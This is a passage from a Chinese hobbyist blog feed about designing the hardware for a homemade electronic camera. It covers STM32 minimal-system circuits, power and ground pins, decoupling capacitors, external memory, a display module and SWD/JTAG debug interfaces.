title="引脚定义"></a>引脚定义</h3><p>其一共有<code>8</code>个引脚，其定义如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403161407118.png"></p><p>更加详细的定义可以在数据手册中的第四章找到。</p><h3 id="电路图连接"><a href="#电路图连接" class="headerlink" title="电路图连接"></a>电路图连接</h3><p>由于其主要通过<code>SPI</code>来和单片机通信，所以：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202137018.png"></p><h2 id="EEPROM存储"><a href="#EEPROM存储" class="headerlink" title="EEPROM存储"></a>EEPROM存储</h2><p><strong>其与单片机之间的通信主要是通过IIC</strong></p><h2 id="扩展外部SRAM"><a href="#扩展外部SRAM" class="headerlink" title="扩展外部SRAM"></a>扩展外部SRAM</h2><p>这里我选择的是美国芯成的<code>IS62WV51216BLL-55TLI</code>单片价格位30左右，价格较低。其大小为<code>8MB</code>。</p><h3 id="引脚定义-2"><a href="#引脚定义-2" class="headerlink" title="引脚定义"></a>引脚定义</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403161744478.png"></p><p><strong>其与单片机之间的通信主要是通过FSMC</strong></p><h3 id="原理图绘制"><a href="#原理图绘制" class="headerlink" title="原理图绘制"></a>原理图绘制</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202137837.png"></p><h1 id="外设"><a href="#外设" class="headerlink" title="外设"></a>外设</h1><p>在使用的<code>stm32f4x</code>的数据手册中有一副图显示了所有可以使用的外设所需要的接线口：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141528030.png"></p><p><strong>该图的位置<code>stm32f4x</code>数据手册的<code>19</code>页</strong>。</p><p>下面记录各个外设所需要使用的<code>stm32</code>中的哪些外设。</p><h2 id="显示器模块"><a href="#显示器模块" class="headerlink" title="显示器模块"></a>显示器模块</h2><p>我直接使用了现成的显示器模块，而不是自己制作。原因是更加方便，节省时间。但是我仍然会尝试自己绘制一个显示器模块的原理图，只是不会制作成PCB</p><p>我选择的是：<a href="https://item.taobao.com/item.htm?abbucket=3&id=565115209712&ns=1&spm=a21n57.1.0.0.27fe523c0LOyzH">中景园电子</a>的一块屏幕，类似的还有：</p><ul><li><a href="https://www.waveshare.net/shop/3.2inch-320x240-Touch-LCD-D.htm">微雪电子的这款屏幕</a>这个是一个完整的模块</li><li><a href="https://item.taobao.com/item.htm?abbucket=3&id=757148877235&ns=1&spm=a21n57.1.0.0.27fe523c0LOyzH">鸿讯电子</a>这个是一个屏幕，而不是模块。</li><li><a href="https://item.taobao.com/item.htm?abbucket=3&id=652798852741&ns=1&spm=a21n57.1.0.0.4d37523c9EqjjZ">电子液晶工厂</a>完整的模块</li></ul><p>中景原电子的<code>3.2inch</code>的电阻触摸显示屏，其主要参数如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202227691.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404012219350.png"></p><p>物理结构：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404012218851.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404012219848.png"></p><h3 id="引脚定义-3"><a href="#引脚定义-3" class="headerlink" title="引脚定义"></a>引脚定义</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404012219115.png"></p><h3 id="显示模块之杂项"><a href="#显示模块之杂项" class="headerlink" title="显示模块之杂项"></a>显示模块之杂项</h3><p>除开上述的东西外。这个显示器还需要使用一种特殊的连接方式，就是<code>FPC</code>软板。其使用特殊的连接器。在购买时可以搜索<code>FPC/FFC</code>连接器。</p><p>这种连接器在原理图上显示为：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202231230.png"></p><p>实际图片：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403202230969.png"></p><p>更加详细的信息可以查看这篇<a href="https://ysc2.github.io/2024/01/25/stm32%E5%92%8C%E6%B6%B2%E6%99%B6%E6%98%BE%E7%A4%BA/">文章</a></p><p><a href="http://www.szholy.com/product/list-16.html">这个网站有各种FPC连接器</a></p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p>首先在电路图中，如果芯片引脚上标注了<code>GND</code>，则这个引脚所接的是导线<code>GND</code>，而不是哪个符号<code>GND</code></p><p>如图：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402250122683.png"></p><p>这个图上<code>1</code>号引脚是<code>GND</code>。所以其接的也是<code>GND</code>，而不是右边排针上接的那个<code>GND</code>的接地符号。</p>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自制电子相机（1）硬件基础</title>
    <link href="/2024/02/21/%E8%87%AA%E5%88%B6%E7%94%B5%E5%AD%90%E7%9B%B8%E6%9C%BA%EF%BC%881%EF%BC%89%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/02/21/%E8%87%AA%E5%88%B6%E7%94%B5%E5%AD%90%E7%9B%B8%E6%9C%BA%EF%BC%881%EF%BC%89%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>对于自制相机的硬件知识点的记录</p><span id="more"></span><h1 id="硬件基础"><a href="#硬件基础" class="headerlink" title="硬件基础"></a>硬件基础</h1><p>这篇文章主要是记录一下硬件方面的基础知识点。</p><h2 id="为什么需要分多组电源引脚"><a href="#为什么需要分多组电源引脚" class="headerlink" title="为什么需要分多组电源引脚"></a>为什么需要分多组电源引脚</h2><p>我们知道一般的IC元器件通常只有两个电源引脚，一个是Vcc或Vdd，另一个是Gnd或Vss。但是现在的MCU通常却有多组电源引脚，这是什么原因呢？</p><p>通过下面可以看到，这个芯片包含了5组。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402220019874.png"></p><p>之所以这样设置的原因有：</p><ol><li>如果只设置一组的话会导致电流在芯片内部的路径过长：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402220102241.png"><br>对于频率高的电路，VDD电流会在高频突变（因为频率越高，需要的电流越大），这时候路径上产生的感抗会阻碍电流的变化，<strong>路径越长感抗越大，从而对电流的阻碍作用就会更明显，</strong>进而导致芯片网络中的电压变化，这样就会影响MCU系统的正常工作。</li></ol><p>对于低频或者直流电路，路径长其影响不大。所以早期的低频MCU，只有一个VDD。<strong>多组VDD可以减少电感效应（电感并联总电感变小，路径变短电感也越小）。</strong></p><ol start="2"><li><p>MCU的模拟外设比如ADC通常是独立的电源VDDA，这是因为ADC需要尽可能干净的电源以保证转换结果的准确性，独立一路可以避免受到其他电源噪声的干扰。</p></li><li><p>多种电压要求。有时，芯片的不同部分会以不同的电压运行。一个典型的例子是低压内核和高压 I&#x2F;O。内核使用较低的电压来降低功耗而 I&#x2F;O 以更高的电压运行，以便更好地与外部电路连接。这时也需要分出来多组供电，常见的是复杂的SOC芯片。</p></li><li><p>多组VDD相比单个VDD，一个VDD引脚上经过的电流会减小，这样引脚不必承受过高的电流，增强可靠性。</p></li></ol><h2 id="各种“地”之间有何区别"><a href="#各种“地”之间有何区别" class="headerlink" title="各种“地”之间有何区别"></a>各种“地”之间有何区别</h2><p>在电子电路中，“地”是一个重要的概念。其被作为是相应种类的器件电路的零电平参考点。</p><p>主要的“地”有：</p><ol><li><p>直流地：直流电路“地”，零电位参考点。</p></li><li><p>交流地：交流电的零线。应与地线区别开。</p></li><li><p>功率地：大电流网络器件、功放器件的零电位参考点。</p></li><li><p>模拟地：放大器、采样保持器、A&#x2F;D转换器和比较器的零电位参考点。</p></li><li><p>数字地：也叫逻辑地，是数字电路的零电位参考点。</p></li><li><p>“热地”：开关电源无需使用工频变压器，其开关电路的“地”和市电电网有关，即所谓的“热地”，它是带电的。</p></li><li><p>“冷地”：由于开关电源的高频变压器将输入、输出端隔离;又由于其反馈电路常用光电耦合器，既能传送反馈信号，又将双方的“地”隔离;所以输出端的地称之为“冷地”，它不带电。</p></li></ol><p>信号接地：设备的信号接地，可能是以设备中的一点或一块金属来作为信号的接地参考点，它为设备中的所有信号提供了一个公共参考电位。</p><p>有单点接地，多点接地，浮地和混合接地。</p><ul><li>单点接地是指整个电路系统中只有一个物理点被定义为接地参考点，其他各个需要接地的点都直接接到这一点上。在低频电路中，布线和元件之间不会产生太大影响。通常频率小于1MHz的电路，采用一点接地。</li><li>多点接地是指电子设备中各个接地点都直接接到距它最近的接地平面上(即设备的金属底板)。</li></ul><p>在高频电路中，寄生电容和电感的影响较大。通常频率大于10MHz的电路，常采用 多点接地。浮地，即该电路的地与大地无导体连接。『 虚地:没有接地，却和地等电位的点。』其优点是该电路不受大地电性能的影响。</p><p>浮地可使功率地(强电地)和信号地(弱电地)之间的隔离电阻很大，所以能阻止共地阻抗电路性耦合产生的电磁干扰。其缺点是该电路易受寄生电容的影响，而使该电路的地电位变动和增加了对模拟电路的感应干扰。</p><p>一个折衷方案是在浮地与公共地之间跨接一个阻值很大的泄放电阻，用以释放所积累的电荷。注意控制释放电阻的阻抗，太低的电阻会影响设备泄漏电流的合格性。</p><p>下图总结了为什么要划分数字地和模拟地：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402220236286.png"></p><p><a href="https://zhuanlan.zhihu.com/p/400824869">https://zhuanlan.zhihu.com/p/400824869</a></p><p>总的来说就是：<strong>减少数字电路和模拟电路之间的干扰，提高电路的可靠性</strong>。</p><h2 id="“地”的-图像"><a href="#“地”的-图像" class="headerlink" title="“地”的 图像"></a>“地”的 图像</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402232027373.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402232028872.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402232029712.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402232029476.png"></p><h2 id="电源引脚有哪些"><a href="#电源引脚有哪些" class="headerlink" title="电源引脚有哪些"></a>电源引脚有哪些</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402220252764.png"></p><h1 id="关于旁路电容和去耦电容"><a href="#关于旁路电容和去耦电容" class="headerlink" title="关于旁路电容和去耦电容"></a>关于旁路电容和去耦电容</h1><p>在电子电路中，去耦电容和旁路电容都是起到抗干扰的作用，电容所处的位置不同，称呼就不一样了。对于同一个电路来说，旁路（bypass）电容是把输入信号中的高频噪声作为滤除对象，把前级携带的高频杂波滤除，而去耦（decoupling）电容也称退耦电容，是把输出信号的干扰作为滤除对象。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281553027.png"></p><h2 id="旁路电容"><a href="#旁路电容" class="headerlink" title="旁路电容"></a>旁路电容</h2><p>所谓旁路电容其实就是<strong>利用了电容对于直流电的阻断，对于交流电的让行的特点</strong>，使用一个电容来吸收高频噪声的。如下图所示的，旁路电容可以给高频的信号一个短路，让其直接回到电源中防止其影响后面的<code>IC</code>等等电路。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402232238773.png"></p><h2 id="去耦电容"><a href="#去耦电容" class="headerlink" title="去耦电容"></a>去耦电容</h2><p>这个电容的作用是去耦，就是去掉耦合。耦合就是联系：</p><p>一般大小为<strong>100nf</strong> +<strong>10uf</strong>并联，电容并联会使得容值加大。</p><p>或者是多个<code>100nf</code>的电容并联。如下图所示：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281557381.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402232349141.png"></p><p>通过上图可以看到，去耦电容的位置接近于<code>IC</code>芯片，其作用有</p><ul><li>去耦，防止由于<code>IC</code>出现的波动对于前面电路的影响</li><li>作为一个“水库”，存储电荷，在<code>IC</code>需要的时候给<code>IC</code>放电。</li></ul><p>使用一个例子来说明：</p><ol><li><p>你可以把总电源看作水库，我们大楼内的家家户户都需要供水，这时候，水不是直接来自于水库，那样距离太远了，等水过来，我们已经渴的不行了。实际水是来自于大楼顶上的水塔，水塔其实是一个buffer的作用。<br><br>如果微观来看，高频器件在工作的时候，其电流是不连续的，而且频率很高，而器件VCC到总电源有一段距离，即便距离不长，在频率很高的情况下，  阻抗Z＝i*wL+R，线路的电感影响也会非常大，会导致器件在需要电流的时候，不能被及时供给。<br><br>而去耦电容可以弥补此不足。<br><br><br>这也是为什么很多电路板在高频器件VCC管脚处放置小电容的原因之一  （在vcc引脚上通常并联一个去藕电容，这样交流分量就从这个电容接地。）</p></li><li><p>有源器件在开关时产生的高频开关噪声将沿着电源线传播。去耦电容的主要功能就是提供一个局部的直流电源给有源器件，以减少开关噪声在板上的传播和将噪声引导到地</p></li></ol><h2 id="二者的区别"><a href="#二者的区别" class="headerlink" title="二者的区别"></a>二者的区别</h2><p>去耦：去除在器件切换时从高频器件进入到配电网络中的RF能量。去耦电容还可以为器件供局部化的DC电压源，它在减少跨板浪涌电流方面特别有用。</p><p>旁路：从元件或电缆中转移出不想要的共模RF能量。这主要是通过产生AC旁路消除无意的能量进入敏感的部分，另外还可以提供基带滤波功能（带宽受限）。</p><p>下图可以看到，二者在电路中位置的不同：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402232358283.png"></p><p>我们经常可以看到，<strong>在电源和地之间连接着去耦电容</strong>，它有三个方面的作用：</p><ol><li><p>是作为本集成电路的蓄能电容；</p></li><li><p>是滤除该器件产生的高频噪声，切断其通过供电回路进行传播的通路；</p></li><li><p>三是防止电源携带的噪声对电路构成干扰。</p></li></ol><p><strong>不管是去耦还是旁路，其在电路中都是并联的。旁路时，被并联的是障碍物，去耦时，被并联的是功能区</strong></p><h1 id="stm32的最小系统板"><a href="#stm32的最小系统板" class="headerlink" title="stm32的最小系统板"></a>stm32的最小系统板</h1><p>对于stm32来说，有一些电路是芯片运行所必须的：</p><ul><li>电源电路<ul><li>保险电路</li><li>电压转换电路</li><li>电源接口电路（USB、TYPEC等等）</li></ul></li><li>时钟电路（晶振）</li><li>复位电路（启动模式）</li><li>自动下载电路</li><li>存储电路（在最小电路中这个是不需要的，但是一般都不是最小电路。这个部分的信息可以去<a href=""></a>这里找到</li><li>TODO</li><li>调试电路</li></ul><p>下面将基于 STM32 单片机（F1 系列）展开讲解。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>学嵌入式，我们一般从单片机学起。学单片机，不能只学软件，硬件知识也要跟上。软硬件相结合的设计，才是真正优秀的设计。</p><p>谈及单片机的硬件设计，我们会先将其浓缩为最小系统，即能实现最基础的功能的最简化设计。以 STM32（F1 系列）单片机为例，最小系统无非是这几部分：<strong>电源、复位、时钟、启动模式、下载调试</strong>。</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605234144.jpg"></p><h2 id="电源"><a href="#电源" class="headerlink" title="电源"></a>电源</h2><p>STM32 的电源有以下几种类型：</p><h3 id="电源开关"><a href="#电源开关" class="headerlink" title="电源开关"></a>电源开关</h3><p>不管是 PCB板 都需要电源开关，但是这个开关需要注意要选择特殊的开关，否则会导致电流无法通过。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406172346245.png"></p><p>上面这张图显示了一种电源开关的时候，需要注意<strong>稳压芯片的 <code>SW</code> 引脚其实就是用来连接开关用的</strong></p><h3 id="主电源（VDD-VSS）"><a href="#主电源（VDD-VSS）" class="headerlink" title="主电源（VDD &#x2F; VSS）"></a>主电源（VDD &#x2F; VSS）</h3><p>主电源指的是标记为 VDD1、VDD2… 的引脚。<br>每个引脚必须加一个 100nF 的滤波电容，且尽量靠近引脚放置，此外需要一个 10uF 的钽电容公用。</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605163136.png"></p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605163204.png"></p><h3 id="后备电源（VBAT）"><a href="#后备电源（VBAT）" class="headerlink" title="后备电源（VBAT）"></a>后备电源（VBAT）</h3><p>VBAT 引脚可用于电池供电。如果不用，可以与 VDD 连接在一起。VBAT 也需要一个 100nF 电容滤波。<br>可参考以下的电源选择电路：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605163337.jpg"></p><h3 id="ADC-电源（VDDA-VSSA）"><a href="#ADC-电源（VDDA-VSSA）" class="headerlink" title="ADC 电源（VDDA &#x2F; VSSA）"></a>ADC 电源（VDDA &#x2F; VSSA）</h3><p>为了提高转换精度，ADC 设备可以从这里取电。一般将 VDDA 通过一个电感后， 与 VDD 相连接。</p><p>若不用到 ADC，可将 VDD，VDDA，VREF+（如果有的话） 接在一起，并对地接 1uF 钽电容 + 10nF 陶瓷电容滤波。</p><h3 id="电源引脚的设置"><a href="#电源引脚的设置" class="headerlink" title="电源引脚的设置"></a>电源引脚的设置</h3><p>在stm32中有很多不同种类的电源，如何处理这些电源成为原理图绘制的一个问题。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402220252764.png"></p><p>其中一般只有一下引脚需要特殊的连接：</p><ul><li><p>VDD：整个引脚的作用一般是当作某个芯片的供电引脚</p></li><li><p>VDDA：stm32中的数据手册规定，整个引脚必须连接在VDD上，其作用一般是给某个芯片正电压（模拟）。<strong>并且必须使用一个电感或者磁珠来将二者隔离开，这是因为VDD是数字电源，而VDDA是模拟电源。</strong><br><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402260058621.png"></p></li><li><p>VCC：这个引脚的作用一般是当作整个电路的输入电压</p></li><li><p>VSS：整个引脚就是数字信号的GND</p></li><li><p>VSSA：整个引脚就是芯片的负电压（数字），这个引脚必须连接VSS，这是数据手册中规定的。其接线方式如下所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281610784.png"></p></li><li><p>VBAT：VBAT &#x3D; 1.8～3.6V：当关闭VDD时，(通过内部电源切换器)为RTC、外部32kHz振荡器和后备寄存器供电。所以一般这个需要单独一个电源进行供电，当然也可以直接接到VDD上，但是这样就失去了其独特的效果。<code>VBAT</code>常见的接法如下图所示： </p><ol><li>使用一个肖特基二极管来整流，改图的主控为<code>stm32f407VGT6</code><br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281528043.png"></li><li>使用锂电池来提供<code>VBAT</code>其实就是使用了电池情况下的接线情况，下图的主控为<code>stm32f407ZET6</code>：<br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281535427.png"></li><li>下面这个接线方式和第一种其实是一样的，其主控为<code>stm32f103ZET6</code>。<br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281537021.png"><br> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281537556.png"></li></ol></li><li><p>VREF+：这个引脚一般作为ADC基准参考电压（正），这个引脚只有在引脚数大于等于100以上时才会有。下图展示了该引脚的接法：</p><ul><li><p>当VREF+没有接在VDDA上时：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281806588.png"></p></li><li><p>当VREF-接在了VDDA上时：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281803133.png"></p></li><li><p><strong>注意，这里的电容必须时质量好的陶瓷电容。</strong></p></li><li><p>一般接法如下：</p><ul><li><p>这个接法没有遵照上面手册中提到的，但是也可以正常工作。<br>   <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281926011.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281926093.png"></p></li><li><p>还有一种按照手册中的接法：注意图中的<code>GNDA</code>就是<code>VSSA</code>。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281931485.png"></p></li></ul></li></ul></li><li><p>VREF-：这个引脚是ADC基准参考电压（负），注意，只有在封装为<code>UFBGA176</code>是才会有。如果有这个引脚，直接将其接到<code>GND</code>上，同<code>VSSA</code>一起。</p></li><li><p>VCAP_1和VCAP_2这两个引脚直接连上电容后接地。一般接法如下：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402290254685.png"></p></li></ul><h2 id="调试电路"><a href="#调试电路" class="headerlink" title="调试电路"></a>调试电路</h2><p>这类其实不需要额外算一种模块，主要就是通过：</p><ul><li>放置<code>LED</code>灯的方式来判断是否有电</li><li>在各个电源处放置测试点，方便对于是否有电进行测试。</li></ul><h2 id="复位电路"><a href="#复位电路" class="headerlink" title="复位电路"></a>复位电路</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402281545785.png"></p><p>由上可知，<code>NRST</code>是低电平有效，所以接线如上所示。</p><p>还有一种接法：</p><p>因为 STM32 内部有上拉电阻（这里没有使用上拉电阻，但是有些人也会加上一个上拉电阻，因为他们认为stm32内部的上拉电阻并不可靠），所以外部只接 100nF 电容 + 按键即可：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605163429.png"></p><p>上电时，CPU 处于复位状态，此时电容充电，NRST 引脚电位持续拉低，当电容充满电后，NRST 电位变为高电平，此时 CPU 退出复位模式，进入正常运行状态。当按钮被按下时，电容被短路清空电量，按钮松开后重新充电，触发复位。</p><p>根据官方设计指南，电容选取 100nF 即可，以保证 NRST 低电平持续的时间满足 CPU 复位的最小脉宽要求，能正常触发复位。</p><p>如果不需要手动复位功能，也可以略去按键。</p><h2 id="时钟"><a href="#时钟" class="headerlink" title="时钟"></a>时钟</h2><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605155729.png"></p><p>如上图，STM32 的时钟分以下几种：</p><ol><li><strong>HSI</strong>：高速内部时钟，是内部的 RC 振荡器，频率为 8MHz</li><li><strong>HSE</strong>：高速外部时钟，可接石英 &#x2F; 陶瓷谐振器，或者接外部时钟源，频率范围为 4MHz~16MHz</li><li><strong>LSI</strong>：低速内部时钟，RC 振荡器，频率为 40kHz. 独立看门狗的时钟源只能是它，同时它也可以作为 RTC 的时钟源</li><li><strong>LSE</strong>：低速外部时钟，接频率为 32.768kHz 的石英晶体。LSE 是给 RTC 用的时钟源</li><li><strong>PLL</strong>：锁相环倍频输出，其时钟输入源可选择为 HSI&#x2F;2，HSE 或 HSE&#x2F;2. 倍频可为 2~16 倍，但是输出频率最大不得超过 72MHz</li></ol><p>从稳定性上考虑，我们在设计的时候一般使用外部晶振作为时钟源。<strong>一般选取 8MHz 晶振作为 HSE</strong>，便于倍频（一般倍频到 72MHz）；<strong>选取 32.768kHz 晶振作为 LSE</strong>，RTC 使用便于分频（32768 是 2 的 15 次方，可以得到精准的时间）。</p><p>至于晶振的选用，有源的精度高，无源的成本低，一般无源就足够了。<br>如果选用无源晶振，则需要在两端要加上起振电容，滤除晶振波形中的高频杂波。容值可选 10 ～ 40pF。这个容值手册中没有明确规定，具体多少可以看晶振的手册。</p><p>晶振输入输出引脚之间可加一个 1M 的电阻，产生负反馈，保证放大器工作在高增益的线性区。同时还起到限流作用，防止反相器驱动过载损坏晶振。</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605171011.png"></p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200612130149.jpg"></p><h2 id="启动模式配置"><a href="#启动模式配置" class="headerlink" title="启动模式配置"></a>启动模式配置</h2><p><strong>一般将 BOOT0 引脚下拉</strong>（串接 10K 电阻再接地），<strong>BOOT1 任意</strong> 即可。</p><p>如果需要模式切换，也可以参照以下的设计：</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605163537.png"></p><p>启动模式详见 <a href="https://wiki-power.com/STM32%E7%9A%84%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F"><strong>STM32 的启动模式</strong></a></p><h2 id="下载调试接口"><a href="#下载调试接口" class="headerlink" title="下载调试接口"></a>下载调试接口</h2><p>首先我们需要知道现在主流的调试接口有哪些：</p><ul><li>SWD</li><li>JTAG</li></ul><p>其中<code>JTAG</code>的功能如下：</p><ul><li>下载器，即下载软件到FLASH里。</li><li>DEBUG，跟医生的听诊器似的，可探听芯片内部小心思。</li><li>边界扫描，可以访问芯片内部的信号逻辑状态，还有芯片引脚的状态等等。</li></ul><p>JTAG根本没有标准的接口定义，甚至每家公司定义都不一样，推丸菌罗列了4种接口定义，有ARM公司的定义，有ST公司的定义等等，仅供大家参考。深入理解TMS&#x2F;TCK&#x2F;TDO&#x2F;TDI等信号。下图为常见的几种定义(大部分采用ARM 20PINS的标准)</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141331576.png"></p><p>从上图可以看出，不同的公司有自己的定义。<strong>一般使用最多的是ARM公司的20PI的定义</strong></p><p><code>SWD</code>的主要的引脚定义如下：<strong>注意，SWD和JTAG所用引脚的作用是差不多的。</strong></p><ul><li>VRef：目标板参考电压信号。用于检查目标板是否供电，直接与目标板VDD联，并不向外输出电压；</li><li>GND：公共地信号；</li><li>SWDIO：串行数据输入输出，作为仿真信号的双向数据信号线，建议上拉(高速下载时一定需要上拉)；</li><li>SWCLK：串行时钟输入，作为仿真信号的时钟信号线，建议下拉(高速下载时一定需要下拉)；</li><li>SWO：串行数据输出引脚，CPU调试接口可通过SWO引脚输出一些调试信息。<strong>该引脚是可选的</strong>；</li><li>RESET：仿真器输出至目标CPU的系统复位信号。该引脚可选，建议选择上，因为ULINK是一定需要该管脚的，使得仿真器能够在连接器件前对器件进行复位，以获得较理想的初始状态，便于后续连接仿真。</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141511383.png"></p><p>调试接口一般使用<code>SWD</code>或者是<code>JTAG</code>，前者的优势是需要的引脚少，后者优势为下载速度更快，更加稳定。</p><h3 id="使用SWD接口的原理图"><a href="#使用SWD接口的原理图" class="headerlink" title="使用SWD接口的原理图"></a>使用SWD接口的原理图</h3><p>四根线的<code>SWD</code>接法是STM32最小系统用的最多的方式，体积小。不过还是建议选择五线SWD。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141515618.png"></p><p>一般我们用 SWD 接口（接线少，方便），<strong>直接引出 SWDIO，SWCLK，VCC，GND 即可</strong>。<br>不需要添加外部上拉／下拉电阻，因为 STM32 内部已经有集成了。</p><p><img src="https://img.wiki-power.com/d/wiki-media/img/20200605170741.png"></p><p>五根线的<code>SWD</code>接法如下所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141516839.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406111734555.png"></p><h3 id="使用JTAG接口的原理图"><a href="#使用JTAG接口的原理图" class="headerlink" title="使用JTAG接口的原理图"></a>使用JTAG接口的原理图</h3><p>这个是<code>20pi</code>接口图<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403141254566.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406111728892.png"></p><p>使用<code>JTAG</code>的接法比使用<code>SWD</code>的接法速度更快，并且稳定性也更好。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是 STM32（F1 系列）最小系统的电路设计。更加详细的内容，可以跳转下面的官方文档和相关文章。</p><h1 id="PCB板之间的连接"><a href="#PCB板之间的连接" class="headerlink" title="PCB板之间的连接"></a>PCB板之间的连接</h1><ol><li>焊接方式： 该方式优点是简单、成本低、可靠性高，可以避免因接触不良而造成的故障;缺点是互换、维修不方便。<ol><li>PCB导线焊接该方式不需任何接插件，只要用导线将PCB板上的对外连接点与板外的元器件直接焊牢即可。</li><li>PCB排线焊接两块 PCB板之间采用排线连接，既可靠又不易出现连接错误</li><li>PCB之间直接焊接此方式常用于两块印制板之间为90度夹角的连接。</li></ol></li><li>插接件连接方式：在比较复杂的仪器设备中，常采用插接件连接方式。不仅保证产品批量生产的质量，降低系统成本，还为调试、维修提供了方便。 <ol><li>印制板插座: 在比较复杂的仪器设备中，经常采用这种连接方式。该方式是从PCB板边缘做出印制插头，插头部分按照插座的尺寸、接点数、接点距离、定位孔的位置等进行设计，使其与专用插座相配。</li><li>标准插针连接：该方式用于PCB板的对外连接；通过标准插针将两块PCB板连接时，一般呈平行或垂直状态，容易实现批量生产。</li></ol></li></ol><h1 id="stm官方提供的手册"><a href="#stm官方提供的手册" class="headerlink" title="stm官方提供的手册"></a>stm官方提供的手册</h1><p>st实际上提供了非常多的参考手册，这不仅仅有编程手册和数据手册还包括：</p><ul><li>笔记文档(AN)</li><li>勘误手册(ES)</li><li>编程手册(PM)</li><li>数据手册(DS)</li><li>参考手册(RM)</li><li>闪存编程手册（Flash Programming Manual</li><li>内核编程手册（Cortex-M Programming Manual）</li><li>用户手册（User Manual）一般是对某个软件库的说明文档。</li><li>工具软件</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402252355234.png"></p><p>注意在官方网页中，不同的手册有不同的字母开头。</p><p><a href="https://www.cnblogs.com/armfly/p/13026991.html">https://www.cnblogs.com/armfly/p/13026991.html</a></p><h2 id="数据手册怎么看"><a href="#数据手册怎么看" class="headerlink" 